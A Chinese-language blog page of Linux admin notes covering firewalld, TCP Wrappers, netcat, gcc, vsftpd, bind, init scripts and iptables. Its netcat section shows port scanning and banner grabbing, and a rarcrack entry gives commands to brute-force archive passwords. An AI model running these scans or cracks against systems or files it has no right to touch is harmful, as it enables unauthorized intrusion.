firewall-cmd命令中使用的参数以及作用参数作用&#x2013;get-default-zone查询默认的区域名称&#x2013;set-default-zone=&lt;区域名称&gt;设置默认的区域，使其永久生效&#x2013;get-zones显示可用的区域&#x2013;get-services显示预先定义的服务&#x2013;get-active-zones显示当前正在使用的区域与网卡名称&#x2013;add-source=将源自此IP或子网的流量导向指定的区域&#x2013;remove-source=不再将源自此IP或子网的流量导向某个指定区域&#x2013;add-interface=&lt;网卡名称&gt;将源自该网卡的所有流量都导向某个指定区域&#x2013;change-interface=&lt;网卡名称&gt;将某个网卡与区域进行关联&#x2013;list-all显示当前区域的网卡配置参数、资源、端口以及服务等信息&#x2013;list-all-zones显示所有区域的网卡配置参数、资源、端口以及服务等信息&#x2013;add-service=&lt;服务名&gt;设置默认区域允许该服务的流量&#x2013;add-port=&lt;端口号/协议&gt;设置默认区域允许该端口的流量&#x2013;remove-service=&lt;服务名&gt;设置默认区域不再允许该服务的流量&#x2013;remove-port=&lt;端口号/协议&gt;设置默认区域不再允许该端口的流量&#x2013;reload让“永久生效”的配置规则立即生效，并覆盖当前的配置规则&#x2013;panic-on开启应急状况模式&#x2013;panic-off关闭应急状况模式使用firewalld配置的防火墙策略默认为运行时（Runtime）模式，又称为当前生效模式，而且随着系统的重启会失效。如果想让配置策略一直存在，就需要使用永久（Permanent）模式了，方法就是在用firewall-cmd命令正常设置防火墙策略时添加&#x2013;permanent参数，这样配置的防火墙策略就可以永久生效了。但是，永久生效模式有一个“不近人情”的特点，就是使用它设置的策略只有在系统重启之后才能自动生效。如果想让配置的策略立生效，需要手动执行firewall-cmd &#x2013;reload命令。使用示例查看firewalld服务当前所使用的区域# firewall-cmd --get-default-zone查询eno16777728网卡在firewalld服务中的区域# firewall-cmd --get-zone-of-interface=eno16777728把firewalld服务中eno16777728网卡的默认区域修改为external，并在系统重启后生效。分别查看当前与永久模式下的区域名称# firewall-cmd --permanent --zone=external --change-interface=eno16777728# firewall-cmd --get-zone-of-interface=eno16777728# firewall-cmd --permanent --get-zone-of-interface=eno16777728把firewalld服务的当前默认区域设置为public# firewall-cmd --set-default-zone=public# firewall-cmd --get-default-zone启动/关闭firewalld防火墙服务的应急状况模式，阻断一切网络连接（当远程控制服务器时请慎用）# firewall-cmd --panic-on# firewall-cmd --panic-off查询public区域是否允许请求SSH和HTTPS协议的流量# firewall-cmd --zone=public --query-service=ssh# firewall-cmd --zone=public --query-service=https把firewalld服务中请求HTTPS协议的流量设置为永久允许，并立即生效# firewall-cmd --zone=public --add-service=https# firewall-cmd --permanent --zone=public --add-service=https# firewall-cmd --reload把firewalld服务中请求HTTP协议的流量设置为永久拒绝，并立即生效：# firewall-cmd --permanent --zone=public --remove-service=http# firewall-cmd --reload 把在firewalld服务中访问8080和8081端口的流量策略设置为允许，但仅限当前生效# firewall-cmd --zone=public --add-port=8080-8081/tcp# firewall-cmd --zone=public --list-ports把原本访问本机888端口的流量转发到22端口，要且求当前和长期均有效流量转发命令格式为:# firewall-cmd --permanent --zone=&lt;区域&gt; --add-forward-port=port=&lt;源端口号&gt;:proto=&lt;协议&gt;:toport=&lt;目标端口号&gt;:toaddr=&lt;目标IP地址&gt;# firewall-cmd --permanent --zone=public --add-forward-port=port=888:proto=tcp:toport=22:toaddr=192.168.10.10# firewall-cmd --reloadfirewalld中的富规则表示更细致、更详细的防火墙策略配置，它可以针对系统服务、端口号、源地址和目标地址等诸多信息进行更有针对性的策略配置。它的优先级在所有的防火墙策略中也是最高的。比如，我们可以在firewalld服务中配置一条富规则，使其拒绝192.168.10.0/24网段的所有用户访问本机的ssh服务（22端口）：$ sudo firewall-cmd --permanent --zone=public --add-rich-rule="rule family="ipv4" source address="192.168.10.0/24" service name="ssh" reject"图形化管理工具服务的访问控制列表TCP Wrappers是RHEL 7系统中默认启用的一款流量监控程序，它能够根据来访主机的地址与本机的目标服务程序作出允许或拒绝的操作。换句话说，Linux系统中其实有两个层面的防火墙，第一种是前面讲到的基于TCP/IP协议的流量过滤工具，而TCP Wrappers服务则是能允许或禁止Linux系统提供服务的防火墙，从而在更高层面保护了Linux系统的安全运行。TCP Wrappers服务的防火墙策略由两个控制列表文件所控制。系统将会先检查允许控制列表文件（/etc/hosts.allow），如果匹配到相应的允许策略则放行流量；如果没有匹配，则去进一步匹配拒绝控制列表文件（/etc/hosts.deny），若找到匹配项则拒绝该流量。如果这两个文件全都没有匹配到，则默认放行流量。Table 20: TCP Wrappers服务的控制列表文件中常用的参数客户端类型示例满足示例的客户端列表单一主机192.168.10.10IP地址为192.168.10.10的主机指定网段192.168.10.IP段为192.168.10.0/24的主机指定网段192.168.10.0/255.255.255.0IP段为192.168.10.0/24的主机指定DNS后缀.linuxprobe.com所有DNS后缀为.linuxprobe.com的主机指定主机名称www.linuxprobe.com主机名称为www.linuxprobe.com的主机指定所有客户端ALL所有主机全部包括在内在配置TCP Wrappers服务时需要遵循两个原则：编写拒绝策略规则时，填写的是服务名称，而非协议名称；建议先编写拒绝策略规则，再编写允许策略规则，以便直观地看到相应的效果。参考资料iptables wikiiptables 百度百科iptables debian wiki5.3.4 删除大文件的前n行Listing 2: 示例：删除前10行tail -n +10 old_file&gt;new_filemv new_file old_file5.3.5 神奇的 nc 命令介绍netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向。netcat所做的就是在两台电脑之间建立链接并返回两个数据流。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。安装// Redhat/CentOS/Fedora$ yum install nc// Debian/Ubuntu$ sudo apt-get install netcat常见使用端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。$ nc -z -v -n 172.31.100.7 21-25可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换(谢谢@jxing 指点)v 参数指使用冗余选项（译者注：即详细输出）n 参数告诉netcat 不要使用DNS反向查询IP地址的域名Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。$ nc -v 172.31.100.7 21聊天工具// Server$ nc -l 1234// Client$ nc 172.168.100.7 1234文件传输// Server &gt; Client$ nc -l 1234 &gt; file.txt$ nc 172.168.100.7 1234 &lt;file.txt目录传输// Server &gt; Client$ tar -cvf - dir_name | nc -l 1234$ nc -n 172.168.100.7 1234 | tar -xvf -这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。在客户端我们下载该压缩包通过netcat 管道然后打开文件。如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。// Server$ tar -cvf – dir_name| bzip2 -z | nc -l 1234// Client$ nc -n 172.31.100.7 1234 | bzip2 -d |tar -xvf -加密网络传输数据// Server$ nc localhost 1234 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt// Client$ mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1234流视频// Server$ cat video.avi | nc -l 1234从一个视频文件中读入并重定向输出到netcat客户端// Client$ nc 172.31.100.7 1234 | mplayer -vo x11 -cache 3000 -从socket中读入数据并重定向到mplayer。克隆一个设备已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。假如你的系统在磁盘/dev/sda上:// Server$ dd if=/dev/sda | nc -l 1234// Client$ nc -n 172.31.100.7 1567 | dd of=/dev/sdadd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。参考资料https://blog.csdn.net/zhangxiao93/article/details/527056425.3.6 GCC简单编译$ gcc test.c -o test实质上，以上这条命令编译过程分为四个阶段进行的，即预处理（预编译，Preprocessing）、编译（Compilation）、汇编（Assembly）和连接（Linking）。1.Preprocessing$ gcc -E test.c -o test.i或$ gcc -E test.cgcc 的 -E 选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将 stdio.h 文件中的内容插入到 test.c 中了。2.Compilation$ gcc -S test.i -o test.sgcc 的 -S 选项，表示在程序编译期间，在生成汇编代码后，停止，-o 输出汇编代码文件。3.Assembly$ gcc -c test.s -o test.o对于上一小节中生成的汇编代码文件 test.s，gas 汇编器负责将其编译为目标文件4.Linkinggcc 连接器是 gas 提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。对于上一小节中生成的 test.o，将其与 Ｃ 标准输入输出库进行连接，最终生成程序 test$ gcc test.o -o test多个程序文件的编译$ gcc test1.c test2.c -o test检错$ gcc -pedantic test.c -o test//警告信息$ gcc -Wall test.c -p test//-Werror 选项，那么 GCC 会在所有产生警告的地方停止编译，迫使程序员对自己的代码进行修改$ gcc -Werror test.c -o test库文件连接1.编译可执行文件。首先我们要进行编译 test.c 为目标文件，这个时候需要执行$ gcc  –c –I /usr/dev/mysql/include test.c –o test.o2.链接。最后我们把所有目标文件链接成可执行文件:$ gcc –L /usr/dev/mysql/lib –lmysqlclient test.o –o test3.强制链接时使用静态链接库。默认情况下， GCC 在链接时优先使用动态链接库，只有当动态链接库不存在时才考虑使用静态链接库，如果需要的话可以在编译时加上 -static 选项，强制使用静态链接库。$ gcc –L /usr/dev/mysql/lib –static –lmysqlclient test.o –o test其他静态库链接时搜索路径顺序：1. ld 会去找GCC命令中的参数 -L2. 再找 gcc 的环境变量 LIBRARY_PATH3. 再找内定目录 /lib /usr/lib /usr/local/lib 这是当初 compile gcc 时写在程序内的动态链接时、执行时搜索路径顺序:1. 编译目标代码时指定的动态库搜索路径2. 环境变量 LD_LIBRARY_PATH 指定的动态库搜索路径3. 配置文件 /etc/ld.so.conf 中指定的动态库搜索路径4. 默认的动态库搜索路径 /lib5. 默认的动态库搜索路径 /usr/lib有关环境变量：LIBRARY_PATH 环境变量：指定程序静态链接库文件搜索路径LD_LIBRARY_PATH 环境变量：指定程序动态链接库文件搜索路径Referencehttp://www.cnblogs.com/ggjucheng/archive/2011/12/14/2287738.html5.3.7 系统状态监视命令：top &amp; htoptophtop下载及安装$ git clone https://github.com/hishamhm/htop $ tar zxvf htop-2.0.2.tar.gz$ cd htop-2.0.2$ ./configure# make &amp;&amp; make install错误解决configure: error: missing libraries: libncursesSolving:$ sudo apt-get install nucurses-dev5.3.8 网络监视命令：iftop$ sudo apt-get install iftop5.3.9 wget vs axel官方地址: http://axel.alioth.debian.org/描述: 替换wget命令5.3.10 VIM&amp;Emacs两个神器软件单独介绍，这里不重复叙写。5.3.11 MPlayer// official：http://www.mplayerhq.hu/design7/news.html$ tar -Jxf MPlayer-1.1.1.tar.xz$ cd MPlayer-1.1.1$ sudo ./configure// 发现，需要安装一个依赖包:yasm$ wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz// 安装完成后，重新配置、编译和安装$ sudo ./configure$ sudo make &amp;&amp; make install5.3.12 google-chrome &amp; chromium添加安装源$ sudo vim /etc/apt/sources.listdeb http://dl.google.com/linux/chrome/deb/ stable main添加公钥验证下载$ wget https://dl-ssl.google.com/linux/linux_signing_key.pub$ apt-key add linux_signing_key.pub执行安装$ sudo apt update// stable ersion$ sudo apt install google-chrome-stable// beta or unstable ersion$ sudo apt install google-chrome-beta$ sudo apt install google-chrome-unstable安装 chromium$ sudo apt-get update$ sudo apt-get install chromium chromium-l10n（chromium-l10n 是用于本地化界面的，是可选的软件包）注意：chromium不支持PDF查看5.3.13 Scrot：截图工具安装$ sudo apt-get install scrot使用方法整个桌面截图(Full desktop)$ scrot$ scrot ~/Downloads/my_desktop.png //Saving to specified directory.特定区域截图（选择截取）(Specific area)$ scrot -s延迟截图(temporize screenshot)$ scrot -s -d 5截图调整质量(Adjust the quality of screenshots)$ scrot -q 50截图调整大小(Adjust the screen size)$ scrot -t 10将截图发送给其他命令(Deliver the intercepted screenshots to other commands)$ scrot -e 'mv $f ~/screenshots'参考资料(References)https://linux.cn/article-3197-1.html5.3.14 rarcrack（压缩包密码破解工具）支持格式：rar,7z,zip// install$ sudo apt-get install libxml2-dev build-essential$ sudo apt-get install rarcrack// use$ rarcrack --threads 10 --type rar test.rar5.3.15 宝塔面板一款使用方便、功能强大且终身免费的服务器管理软件。详见官网:http://www.bt.cn/5.3.16 Cisco AnyConnect VPN Client问题解决$ sudo systemctl enable vpnagentd_initvpnagentd_init.service is not a native service, redirecting to systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable vpnagentd_initinsserv: warning: script 'vpnagentd_init' missing LSB tags and overridesinsserv: There is a loop between service bt and vpnagentd_init if stoppedinsserv:  loop involving service vpnagentd_init at depth 2insserv:  loop involving service bt at depth 1insserv: Stopping vpnagentd_init depends on bt and therefore on system facility `$all' which can not be true!insserv: exiting now without changing boot order!update-rc.d: error: insserv rejected the script header[solve]：$ sudo vim /etc/init.d/vpnagentd_init#!/bin/sh### BEGIN INIT INFO# Provides: vpnagentd_init# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start Cisco vpn agent daemon at boot time# Description: Cisco vpn agent daemon### END INIT INFO5.3.17 Bind：DNS工具安装# yum install -y bind配置1)# vim /etc/named.conf修改内容如下： 将下面 listen-on port 53 { 127.0.0.1; }; allow-query { localhost; }; 改为 listen-on port 53 { any; }; allow-query { any; };2)# vim named.rfc1912.zones注意改动位置：zone "zrg.com.cn" IN {type master;file "named.zrg";allow-update { none; };};3)# cp /var/named/named.localhost /var/named/named.zrg//修改文件所属群组#chgrp named /var/named/named.zrg4)# vim /var/named/named.zrg注意改动位置：$TTL 1D@ IN SOA @ dns.zrg.com.cn. root(0 ; serial1D ; refresh1H ; retry1W ; expire3H ) ; minimumNS dns.zrg.com.cn.DNS A 192.168.120.166A 127.0.0.1AAAA ::15)# /etc/init.d/named restart# chkconfig named on6)# vim /etc/sysconfig/networkNetwork=yesHostname=dns.zrg.com.cn7)# vim /etc/resolv.confSearch zrg.com.cnNameserver 192.168.120.1668)# /etc/init.d/named restart# ping zrg.com.cn# reboot5.3.18 Composer安装1.Download composer.phar file.2.Excute:# php composer.phar3.Global:# mv composer.phar /usr/local/bin/composer4.Permission:# chmod 744 composer问题解决error: /usr/bin/env: php: No such file or directory solve:Configuring php to become global variables5.3.19 vsftpdDownload and Installhttps://security.appspot.com/vsftpd.html#download//yumyum install -y vsftpdChange default dir#local userlocal_root=/usr/share/nginx/html#is_enable local view,default_setting is NOchroot_local_user=NO#anonymous useranon_root=/var/ftp/pubConfiguring directory of accesschroot_local_user=YESchroot_list_enable=NOallow_writeable_chroot=YES&#25253;&#22914;&#19979;&#38169;&#35823;&#65292;&#26159;&#22240;&#20026;&#27809;&#26377;&#28155;&#21152;&#19978;&#38754;&#30340;&#31532;&#19977;&#26465;&#35821;&#21477;&#65292;&#23548;&#33268;&#29992;&#25143;&#26080;&#27861;&#38145;&#23450;&#33258;&#24049;&#30340;&#30446;&#24405;&#12290;   500 OOPS: vsftpd: refusing to run with writable root inside chroot()notice: &#37197;&#32622;&#20855;&#20307;&#24773;&#20917;&#26377;&#20197;&#19979;&#20960;&#31181;&#65306;1&#65289;&#24403; chroot_list_enable=yes&#65292;chroot_local_user=yes&#26102;&#65292;&#22312;/etc/vsftpd/chroot_list&#25991;&#20214; &#20013;&#21015;&#20986;&#30340;&#29992;&#25143;&#65292;&#21487;&#20197;&#20999;&#25442;&#21040;&#19978;&#32423;&#30446;&#24405;&#65307;&#26410;&#22312;&#25991;&#20214;&#20013;&#21015;&#20986;&#30340;&#29992;&#25143;&#65292;&#19981;&#33021;&#20999;&#25442;&#21040;&#31449;&#28857;&#26681;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;&#12290;2&#65289;&#24403; chroot_list_enable=yes&#65292;chroot_local_user=no&#26102;&#65292;&#22312;/etc/vsftpd/chroot_list&#25991;&#20214;&#20013; &#21015;&#20986;&#30340;&#29992;&#25143;&#65292;&#19981;&#33021;&#20999;&#25442;&#21040;&#31449;&#28857;&#26681;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;&#65307;&#26410;&#22312;&#25991;&#20214;&#20013;&#21015;&#20986;&#30340;&#29992;&#25143;&#65292;&#21487;&#20197;&#20999;&#25442;&#21040;&#19978;&#32423;&#30446;&#24405;&#12290;3&#65289;&#24403; chroot_list_enable=no&#65292;chroot_local_user=yes&#26102;&#65292;&#25152;&#26377;&#29992;&#25143;&#22343;&#19981;&#33021;&#20999;&#25442;&#21040;&#19978;&#32423;&#30446;&#24405;&#12290;4&#65289;&#24403; chroot_list_enable=no&#65292;chroot_local_user=no&#26102;&#65292;&#25152;&#26377;&#29992;&#25143;&#22343;&#21487;&#20197;&#20999;&#25442;&#21040;&#19978;&#32423;&#30446;&#24405;&#12290;5&#65289;&#24403;&#29992;&#25143;&#19981;&#20801;&#35768;&#20999;&#25442;&#21040;&#19978;&#32423;&#30446;&#24405;&#26102;&#65292;&#30331;&#24405;&#21518;ftp&#31449;&#28857;&#30340;&#26681;&#30446;&#24405;&#8220;/&#8221;&#26159;&#35813;ftp&#36134;&#25143;&#30340;&#20027;&#30446;&#24405;&#65292;&#21363;&#25991;&#20214;&#30340;&#31995;&#32479;&#30340;/var/ftp&#30446;&#24405;&#12290;my vsftpd.conf//CentOS 7, /etc/vsftpd/vsftpd.conf.# Example config file /etc/vsftpd/vsftpd.conf# Allow anonymous FTP? (Beware - allowed by default if you comment this out).anonymous_enable=NO#local_root=/srv/www/## Uncomment this to allow local users to log in.# When SELinux is enforcing check for SE bool ftp_home_dirlocal_enable=YES## Uncomment this to enable any form of FTP write command.write_enable=YES## Default umask for local users is 077. You may wish to change this to 022,# if your users expect that (022 is used by most other ftpd's)local_umask=022## Uncomment this to allow the anonymous FTP user to upload files. This only# has an effect if the above global write enable is activated. Also, you will# obviously need to create a directory writable by the FTP user.# When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access#anon_upload_enable=YES## Uncomment this if you want the anonymous FTP user to be able to create# new directories.#anon_mkdir_write_enable=YES## Activate directory messages - messages given to remote users when they# go into a certain directory.dirmessage_enable=YES## Activate logging of uploads/downloads.xferlog_enable=YES## Make sure PORT transfer connections originate from port 20 (ftp-data).connect_from_port_20=YES## If you want, you can arrange for uploaded anonymous files to be owned by# a different user. Note! Using "root" for uploaded files is not# recommended!#chown_uploads=YES#chown_username=whoever## You may override where the log file goes if you like. The default is shown# below.#xferlog_file=/var/log/xferlog## If you want, you can have your log file in standard ftpd xferlog format.# Note that the default log file location is /var/log/xferlog in this case.xferlog_std_format=YES## You may change the default value for timing out an idle session.#idle_session_timeout=600## You may change the default value for timing out a data connection.#data_connection_timeout=120## It is recommended that you define on your system a unique user which the# ftp server can use as a totally isolated and unprivileged user.#nopriv_user=ftpsecure## Enable this and the server will recognise asynchronous ABOR requests. Not# recommended for security (the code is non-trivial). Not enabling it,# however, may confuse older FTP clients.#async_abor_enable=YES## By default the server will pretend to allow ASCII mode but in fact ignore# the request. Turn on the below options to have the server actually do ASCII# mangling on files when in ASCII mode.# Beware that on some FTP servers, ASCII support allows a denial of service# attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd# predicted this attack and has always been safe, reporting the size of the# raw file.# ASCII mangling is a horrible feature of the protocol.#ascii_upload_enable=YES#ascii_download_enable=YES## You may fully customise the login banner string:#ftpd_banner=Welcome to blah FTP service.## You may specify a file of disallowed anonymous e-mail addresses. Apparently# useful for combatting certain DoS attacks.#deny_email_enable=YES# (default follows)#banned_email_file=/etc/vsftpd/banned_emails## You may specify an explicit list of local users to chroot() to their home# directory. If chroot_local_user is YES, then this list becomes a list of# users to NOT chroot().# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that# the user does not have write access to the top level directory within the# chroot)chroot_local_user=YESchroot_list_enable=YESallow_writeable_chroot=YES# (default follows)chroot_list_file=/etc/vsftpd/chroot_list## You may activate the "-R" option to the builtin ls. This is disabled by# default to avoid remote users being able to cause excessive I/O on large# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume# the presence of the "-R" option, so there is a strong case for enabling it.#ls_recurse_enable=YES## When "listen" directive is enabled, vsftpd runs in standalone mode and# listens on IPv4 sockets. This directive cannot be used in conjunction# with the listen_ipv6 directive.listen=NO## This directive enables listening on IPv6 sockets. By default, listening# on the IPv6 "any" address (::) will accept connections from both IPv6# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6# sockets. If you want that (perhaps because you want to listen on specific# addresses) then you must run two copies of vsftpd with two configuration# files.# Make sure, that one of the listen options is commented !!listen_ipv6=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YESReferenceshttps://security.appspot.com/vsftpd.htmlhttps://en.wikipedia.org/wiki/Vsftpdhttp://baike.baidu.com/item/vsftpd5.3.20 Cygwin：windows 下 Linux 模拟软件安装Cygwin略提示：安装软件时，可使用中国科技大学软件源mirrors.ustc.edu.cn/cygwin// 举例说明：安装及配置ssh1.运行安装文件2.搜索ssh，在Net类别下选上OpenSSH和OpenSSL两项3.安装完成后，打开Cygwin，输入ssh-host-config当询问if privilege separation should be used 时输入 no . 当询问if sshd should be installed as a service 时输入yes . 当询问about the value of CYGWIN environment variable enter 时输入 ntsec .其余询问均输入 no4.在cygwin中输入 cygrunsrv --start sshd 启动sshd5.打开cygwin，输入 ssh-keygen，当询问要filenames 和 pass phrases 的时候都点回车，接受默认的值6.命令结束后输入 cd ~/.ssh 转到.ssh目录，输入 ls –l 应该包含两个文件：id_rsa.pub 和 id_rsa7.在第8步的窗口（当前目录在.ssh）中输入 cat id_rsa.pub &gt;&gt; authorized_keys8.输入 ssh localhost 启动SSH参考资料1.Cygwin-Official Site:http://cygwin.com/2.Cygwin-Wikipedia:https://en.wikipedia.org/wiki/Cygwin3.Cygwin-百度百科：http://baike.baidu.com/view/3968.htm4.Cygwin在线安装指南：http://www.crifan.com/files/doc/docbook/cygwin_intro/release/htmls/install_cygwin_setup_exe.html5.3.21 Wps for Linux1. 从官网下载安装包，网址：http://www.wps.cn/2. 安装$ sudo dpkg -i wps_office_10.xxx.deb3. 安装完成后，提示“系统缺失字体symbol、wingdings、wingdings 2、wingdings 3、webding”的解决办法：1) 下载缺失的字体文件，然后复制到Linux系统中的/usr/share/fonts文件夹中。国外下载地址：https://www.dropbox.com/s/lfy4hvq95ilwyw5/wps_symbol_fonts.zip国内下载地址：http://pan.baidu.com/s/1mh0lcbY或者直接 在win 中（C/WINDOWS/FONTS）2) 执行以下命令,生成字体的索引信息：$ sudo mkfontscale$ sudo mkfontdir3) 运行fc-cache命令更新字体缓存$ sudo fc-cache5.3.22 gnome-screenshots常用快捷键Prt Scrn to take a screenshot of the desktop.Alt+Prt Scrn to take a screenshot of a window.Shift+Prt Scrn to take a screenshot of an area you select.参考资料(References)Screenshots and screencasts5.4 网络(Network)6 常见问题解决(Problem)6.1 不能在 Sublime 编辑器（Editor）中输入中文下载（Download）$ git clone https://github.com/lyfeyaj/sublime-text-imfix.git配置（Configure）$ cd ~/sublime-text-imfix$ sudo cp ./lib/libsublime-imfix.so /opt/sublime_text/$ sudo cp ./src/subl /usr/bin/ $ LD_PRELOAD=./libsublime-imfix.so subl新建Shell脚本$ vim /home/zrg/sublime#!/bin/bashLD_PRELOAD=/opt/sublime_text/libsublime-imfix.so subl参考资料http://www.jianshu.com/p/bf05fb3a47096.2 解决系统不能支持加密算法：chacha20$ sudo apt-get install m2crypto gcc -y$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz$ tar zxvf libsodium-1.0.8.tar.gz$ cd libsodium-1.0.8$ ./configure$ sudo make &amp;&amp; make install$ sudo echo "include ld.so.conf.d/*.conf"&gt;/etc/ld.so.conf$ sudo echo "/lib"&gt;&gt;/etc/ld.so.conf$ sudo echo "/usr/lib64"&gt;&gt;/etc/ld.so.conf$ sudo echo "/usr/local/lib"&gt;&gt;/etc/ld.so.conf$ ldconfig6.3 软件源配置不全，导致软件不能安装//Error: Can't fix the error because you are asking some packages to stay the same, that is they break the dependencies between the packages.//翻译：无法修正错误,因为您要求某些软件包保持现状,就是它们破坏了软件包间的依赖关系//解决：检查安装源，进行重新配置，必要时添加debian官方安装源$ vim /etc/apt/sources.list$ sudo apt-get update6.4 .deb 转换为 .rpm6.4.1 下载及安装 alien1.下载:$ wget https://packages.debian.org/unstable/source/alien2.安装:$ tar xpvf alien_8.95.tar.xz $ cd alien-8.95$ make &amp;&amp; make install6.4.2 转换(Conversion)$ alien -r kuaipan4uk_2.0.0.5_amd64.deb6.5 软件自启动脚本实例6.5.1 实例：php-fpm 服务启动脚本$ sudo vim /etc/init.d/php-fpm#!/bin/sh# DateTime:2017-03-09# Author:zrg# chkconfig: - 84 16. /etc/rc.d/init.d/functions# Source networking configuration.. /etc/sysconfig/network# Check that networking is up.[ "$NETWORKING" = "no" ] &amp;&amp; exit 0phpfpm="/usr/local/php/sbin/php-fpm"prog=$(basename ${phpfpm})lockfile=/var/lock/subsys/phpfpmstart() {    [ -x ${phpfpm} ] || exit 5    echo -n $"Starting $prog: "    daemon ${phpfpm}    retval=$?    echo    [ $retval -eq 0 ] &amp;&amp; touch $lockfile    return $retval}stop() {    echo -n $"Stopping $prog: "    killproc $prog -QUIT    retval=$?    echo    [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile    return $retval}restart() {    configtest || return $?    stop    start}reload() {    configtest || return $?    echo -n $"Reloading $prog: "killproc ${phpfpm} -HUP    RETVAL=$?    echo}force_reload() {    restart}configtest() {  ${phpfpm} -t}rh_status() {    status $prog}rh_status_q() {    rh_status &gt;/dev/null 2&gt;&amp;1}case "$1" in    start)        rh_status_q &amp;&amp; exit 0        $1        ;;    stop)        rh_status_q || exit 0        $1        ;;    restart|configtest)        $1        ;;    reload)        rh_status_q || exit 7        $1        ;;    status)        rh_status        ;;     *)        echo $"Usage: $0 {start|stop|status|restart|reload|configtest}"        exit 2esac脚本说明：# Source function library.  . /etc/rc.d/init.d/functions  //类似于include,require，引入文件。# Source networking configuration.  . /etc/sysconfig/network   //同理。//引入后，用到的daemon、statusNETWORKING=yes HOSTNAME=E10162//将他们作为变量赋值,判断网卡是否启动，如果你的 nginx 不走网卡，其实网络这段可以去掉//daemon便是实现上图漂亮的【 OK 】的函数.2.设置自启动# php-fpm 加入服务chkconfig --add php-fpm# php-fpm 234 级别下设置为启动chkconfig php-fpm on# 查看 php-fpm 服务当前配置chkconfig --list php-fpmphp-fpm         0:off   1:off   2:on    3:on    4:on    5:on    6:off3.php-fpm操作# 启动/关闭/重启/重载service php-fpm start/stop/restart/reload# 检查配置文件#service php-fpm configtest6.5.2 Referenceshttp://www.ttlsa.com/php/php-fpm-service-scripts/6.6 解决 dpkg: warning: files list file for package 'x' missing 问题Listing 3: for package in $(apt-get upgrade 2&gt;&amp;1 |\                 grep "warning: files list file for package '" |\                 grep -Po "[^'\n ]+'" | grep -Po "[^']+"); do    apt-get install --reinstall "$package";done6.7 dpkg: error: failed to open package info file `/var/lib/dpkg/available' for reading$ sudo dpkg --configure -a$ sudo apt-get -f install$ sudo apt-get --fix-missing install$ sudo apt-get clean$ sudo apt-get update$ sudo apt-get upgrade$ sudo apt-get dist-upgrade$ sudo apt-get clean$ sudo apt-get autoremove6.8 CentOS 7关闭firewall，安装iptables1. 查看安装和状态$ yum installed firewalld iptables$ systemctl list-unit-files firewalld.service iptables.service2. 停止并禁止自启动firewall和安装iptables防火墙$ systemctl stop firewalld.service$ systemctl disable firewalld.service$ yum install iptables-service$ systemctl enable iptables.service3. 编辑并修改配置文件/etc/sysconfig/iptables，使用如下配置*filter:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]:TEST - [0:0]-A INPUT -j TEST-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --rcheck --seconds 1 --hitcount 15 -j DROP-A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --set-A INPUT -i eth1 -p tcp -m tcp -d 192.168.1.100 --syn -m connlimit --connlimit-above 50 --connlimit-mask 32 --connlimit-saddr -j DROP#-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m length --length 0:128 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT... ...-A INPUT -j DROP-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j TEST-A FORWARD -j REJECT --reject-with icmp-host-prohibited-A OUTPUT -j TEST-A TEST -j RETURNCOMMIT4. 查看防火墙规则是否启用。$ iptables -L]]></content>
      <categories>
        
          <category> linux </category>
        
      </categories>
      <tags>
        
          <tag> Debian </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 程序员升级之路]]></title>
      <url>/php/2018/08/05/learning-php/</url>
